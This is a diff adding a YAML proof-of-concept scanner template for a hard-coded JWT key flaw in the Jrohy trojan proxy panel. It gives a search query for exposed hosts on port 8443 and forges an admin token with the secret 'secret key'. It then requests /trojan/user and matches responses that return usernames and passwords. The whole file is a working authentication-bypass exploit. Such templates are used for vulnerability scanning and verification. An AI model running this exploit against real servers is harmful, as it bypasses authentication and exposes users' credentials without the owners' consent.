@@ -1,0 +1,19 @@
+id: poc-yaml-jrohy-trojan-hard-coded-key
+info:
+  name: Jrohy trojan 硬编码密钥漏洞
+  severity: high
+  tags:
+  - 硬编码凭据
+  finger: trojan
+  fofa: body="IOS-Self-Signed-Certificate" && port="8443"
+variables:
+  jwt: gen_jwt(`{"exp":3939014838, "id":"admin", "orig_iat":1939014838}`,"HS256","secret
+    key")
+requests:
+- method: GET
+  path: /trojan/user
+  headers:
+    Authorization: Bearer {{.jwt}}
+  expression: status_code == 200 && contains(body,"\"Data\":") && contains(body,"\"Username\":")
+    && contains(body,"\"Password\":") && contains(body,"\"Msg\":\"success\"")
+transport: http
